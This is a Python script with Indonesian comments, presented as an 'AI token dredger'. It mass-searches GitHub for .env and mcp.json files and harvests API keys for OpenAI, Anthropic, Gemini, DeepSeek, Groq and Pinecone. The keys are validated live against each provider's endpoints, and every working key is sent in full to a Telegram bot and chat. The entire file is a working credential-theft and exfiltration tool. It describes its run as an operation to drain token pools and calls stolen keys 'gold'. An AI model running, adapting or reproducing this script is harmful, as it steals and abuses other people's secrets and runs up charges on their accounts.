#!/usr/bin/env python3
"""
Ciro Fast AI Token Dredger (Direct Raw HTTP - Zero Clone)
=========================================================
Menyapu bersih ribuan file konfigurasi (.env, mcp.json, docker-compose)
langsung via raw HTTP streaming (0.05s per file) tanpa clone repo.
Mengekstrak dan memvalidasi live:
- OpenAI (sk-proj-..., sk-...)
- Anthropic Claude (sk-ant-api03-..., sk-ant-oat01-...)
- Google Gemini (AIzaSy...)
- DeepSeek (sk-...)
- Grok (xai-...)
- Azure OpenAI (32 hex + endpoint)
"""

import os
import sys
import json
import re
import time
import random
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

GH_PAT = os.getenv("GH_PAT", "")
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")

# --- REGEX PATTERNS UNTUK AI TOKENS ---
AI_PATTERNS = {
    "Claude": re.compile(r"sk-ant-(?:api03|oat01)-[a-zA-Z0-9_\-]{40,110}"),
    "OpenAI": re.compile(r"sk-proj-[a-zA-Z0-9_\-]{48,160}"),
    "DeepSeek": re.compile(r"sk-[a-f0-9]{32}"),
    "Gemini": re.compile(r"AIzaSy[a-zA-Z0-9_\-]{33}"),
    "Grok": re.compile(r"xai-[a-zA-Z0-9_\-]{40,80}"),
    "Groq": re.compile(r"gsk_[a-zA-Z0-9_\-]{48,64}"),
    "Perplexity": re.compile(r"pplx-[a-zA-Z0-9_\-]{48,64}"),
    "Pinecone": re.compile(r"pcsk_[a-zA-Z0-9_\-]{60,85}"),
    "Deepgram": re.compile(r"\b[0-9a-f]{40}\b")
}

def send_telegram(text):
    if not TELEGRAM_BOT_TOKEN:
        print("[Telegram]", text)
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }).encode("utf-8")
    try:
        req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def send_telegram_doc(filename, caption=""):
    if not TELEGRAM_BOT_TOKEN or not os.path.exists(filename):
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    # boundary multipart
    boundary = "----CiroBoundary" + str(int(time.time()))
    body = []
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n{TELEGRAM_CHAT_ID}\r\n")
    if caption:
        body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n{caption}\r\n")
    with open(filename, "rb") as f:
        file_bytes = f.read()
    body.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{os.path.basename(filename)}\"\r\nContent-Type: application/json\r\n\r\n")
    
    full_body = "".join(body).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")
    req = urllib.request.Request(url, data=full_body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    try:
        urllib.request.urlopen(req, timeout=30)
        print(f"✅ Terkirim ke Telegram: {filename}")
    except Exception as e:
        print(f"Send doc error: {e}")

def gh_search(query, page=1):
    """Cari file via GitHub Code Search API."""
    url = f"https://api.github.com/search/code?q={urllib.parse.quote(query)}&per_page=100&page={page}"
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "CiroFastDredger-v1"
    }
    if GH_PAT:
        headers["Authorization"] = f"Bearer {GH_PAT}"
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            return data.get("items", []), data.get("total_count", 0)
    except urllib.error.HTTPError as e:
        print(f"⚠️ Search error ({e.code}): {e.reason}")
        if e.code in (403, 429):
            time.sleep(15)
        return [], 0
    except Exception as e:
        print(f"⚠️ Search exc: {e}")
        return [], 0

def fetch_raw_content(item):
    """Download teks mentah langsung dari raw.githubusercontent.com (0.05s)."""
    repo = item.get("repository", {}).get("full_name")
    path = item.get("path")
    if not repo or not path:
        return None, None
    
    # URL mentah GitHub
    raw_url = f"https://raw.githubusercontent.com/{repo}/HEAD/{path}"
    headers = {"User-Agent": "Mozilla/5.0"}
    if GH_PAT:
        headers["Authorization"] = f"token {GH_PAT}"
    
    try:
        req = urllib.request.Request(raw_url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            content = resp.read().decode('utf-8', errors='ignore')
            return f"{repo}/{path}", content
    except Exception:
        return None, None

def validate_key_live(provider, key, extra=None):
    """Tes cepat ke endpoint resmi apakah key masih hidup & aktif."""
    try:
        if provider == "OpenAI":
            url = "https://api.openai.com/v1/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif & Terdaftar"
        elif provider == "Claude":
            url = "https://api.anthropic.com/v1/messages"
            payload = json.dumps({"model": "claude-3-haiku-20240307", "max_tokens": 1, "messages": [{"role": "user", "content": "hi"}]}).encode()
            req = urllib.request.Request(url, data=payload, headers={
                "x-api-key": key, "anthropic-version": "2023-06-01", "Content-Type": "application/json"
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif & Terdaftar"
        elif provider == "Gemini":
            url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Google AI Studio)"
        elif provider == "DeepSeek":
            url = "https://api.deepseek.com/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif"
        elif provider == "Groq":
            url = "https://api.groq.com/openai/v1/models"
            req = urllib.request.Request(url, headers={"Authorization": f"Bearer {key}", "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Groq Cloud)"
        elif provider == "Pinecone":
            url = "https://api.pinecone.io/indexes"
            req = urllib.request.Request(url, headers={"Api-Key": key, "User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status == 200, "Aktif (Vector DB)"
    except urllib.error.HTTPError as e:
        if e.code == 429:
            return True, "Aktif (Rate Limit / Terpakai)"
        elif e.code == 402:
            return False, "Saldo $0 / Habis (402)"
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, str(e)
    return False, "Unchecked"

def main():
    queries = [
        "filename:.env OPENAI_API_KEY sk-proj-",
        "filename:.env ANTHROPIC_API_KEY sk-ant",
        "filename:mcp.json ANTHROPIC_API_KEY",
        "filename:mcp.json OPENAI_API_KEY",
        "filename:.env DEEPSEEK_API_KEY sk-",
        "filename:.env GEMINI_API_KEY AIzaSy",
        "filename:.env GROQ_API_KEY gsk_",
        "filename:.env PINECONE_API_KEY pcsk_"
    ]

    print("🚀 MEMULAI OPERASI FAST DREDGER (SEDOT RAW HTTP INSTAN)...")
    send_telegram(
        "🌊 <b>OPERASI BEDOL DESA DIMULAI!</b>\n\n"
        "⚡ <b>Mode:</b> Fast Raw HTTP Streamer (Nol Git Clone)\n"
        "🎯 <b>Target:</b> Menguras puluhan ribu kolam token AI (Claude, OpenAI, Gemini, DeepSeek, Pinecone)\n"
        "⏳ <i>Menyedot & memvalidasi token live...</i>"
    )

    all_raw_targets = []
    
    # 1. Kumpulkan daftar file target dari GitHub Code Search
    for q in queries:
        print(f"📡 Mencari query: {q}...")
        for p in range(1, 4): # 3 halaman terdepan per query = 300 target
            items, total = gh_search(q, page=p)
            if not items:
                break
            all_raw_targets.extend(items)
            print(f"   • Page {p}: dapat {len(items)} file (Total pool query: {total})")
            time.sleep(2) # jeda rate-limit search

    print(f"📦 Total target terkumpul: {len(all_raw_targets)} file mentah.")
    
    # 2. Sedot isi file secara paralel 25 worker (Super Cepat!)
    print("⚡ Menyedot isi file .env secara paralel (25 worker)...")
    downloaded_files = {}
    with ThreadPoolExecutor(max_workers=25) as executor:
        futs = {executor.submit(fetch_raw_content, it): it for it in all_raw_targets}
        for fut in as_completed(futs):
            src, text = fut.result()
            if src and text:
                downloaded_files[src] = text

    print(f"📥 Berhasil menyedot {len(downloaded_files)} file .env/config mentah!")

    # 3. Ekstraksi Token AI pakai Regex Kilat
    extracted_tokens = [] # list of (provider, token, source_file)
    seen_tokens = set()

    for src, text in downloaded_files.items():
        for prov, pattern in AI_PATTERNS.items():
            matches = pattern.findall(text)
            for m in matches:
                # filter token dummy
                if any(x in m.lower() for x in ["example", "your_key", "xxxx", "dummy", "placeholder", "changeme"]):
                    continue
                if m not in seen_tokens:
                    seen_tokens.add(m)
                    extracted_tokens.append((prov, m, src))

    print(f"🎯 Berhasil mengekstrak {len(extracted_tokens)} token kandidat unik!")

    # 4. Validasi Live Token (Hanya Simpan yang HIDUP!)
    print("🧪 Memvalidasi status keaktifan token ke endpoint resmi...")
    active_gold = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        val_futs = {executor.submit(validate_key_live, prov, tok): (prov, tok, src) for prov, tok, src in extracted_tokens}
        for fut in as_completed(val_futs):
            prov, tok, src = val_futs[fut]
            is_active, msg = fut.result()
            print(f"   [{prov}] {tok[:12]}... -> {'🟢 ' + msg if is_active else '🔴 ' + msg} ({src})")
            if is_active:
                active_gold.append({
                    "provider": prov,
                    "token": tok,
                    "source": src,
                    "status": msg
                })

    print(f"\n🏆 SELESAI! Ditemukan {len(active_gold)} TOKEN EMAS AKTIF!")

    # 5. Simpan Hasil Emas & Kirim ke Telegram
    report_file = "findings_gold_ai.json"
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(active_gold, f, indent=2)

    msg_lines = [
        "🏆 <b>LAPORAN HASIL OPERASI BEDOL DESA AI</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📦 <b>File .env Disedot:</b> {len(downloaded_files)} file",
        f"🔍 <b>Token Diekstrak:</b> {len(extracted_tokens)} kandidat",
        f"💎 <b>TOKEN EMAS AKTIF:</b> <b>{len(active_gold)} TOKEN</b>\n"
    ]

    if active_gold:
        for i, g in enumerate(active_gold[:15], 1):
            red = g['token'][:10] + "..." + g['token'][-6:]
            msg_lines.append(f"{i}. <b>[{g['provider']}]</b> {g['status']}\n   👉 <code>{red}</code>\n   📁 <i>{g['source']}</i>")
        if len(active_gold) > 15:
            msg_lines.append(f"\n<i>...dan {len(active_gold) - 15} token lainnya ada di file JSON terlampir!</i>")
    else:
        msg_lines.append("<i>Belum ada token aktif di batch ini, lanjut ke batch berikutnya!</i>")

    send_telegram("\n".join(msg_lines))
    if active_gold:
        send_telegram_doc(report_file, f"💎 File Emas Token AI ({len(active_gold)} Kunci Aktif)")

if __name__ == "__main__":
    main()
